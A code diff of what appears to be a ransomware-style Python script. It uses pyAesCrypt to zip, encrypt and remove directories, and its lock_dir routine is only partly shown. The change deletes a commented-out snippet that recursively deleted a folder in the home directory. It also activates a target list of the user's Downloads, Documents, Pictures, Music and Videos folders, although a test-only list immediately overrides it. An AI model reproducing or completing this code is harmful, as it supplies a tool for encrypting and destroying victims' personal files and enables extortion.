@@ -1,16 +1,3 @@
-# import os
-# import shutil
-
-# def delete_dir(directory):
-#   # Delete directory and all its contents
-#   shutil.rmtree(directory)
-
-# root_dir = os.path.expanduser('~')
-
-# file_path = os.path.join(root_dir, "test")
-
-# delete_dir(file_path)
-
 import os
 import shutil
 import pyAesCrypt
@@ -43,7 +30,7 @@ def lock_dir(directory):
     os.remove(f"{directory}.zip")
 
 # lock the directory
-# dirs_to_lock = ["Downloads", "Documents", "Pictures", "Music", "Videos"]
+dirs_to_lock = ["Downloads", "Documents", "Pictures", "Music", "Videos"]
 dirs_to_lock = ["Test"]
 
 for dir in dirs_to_lock:
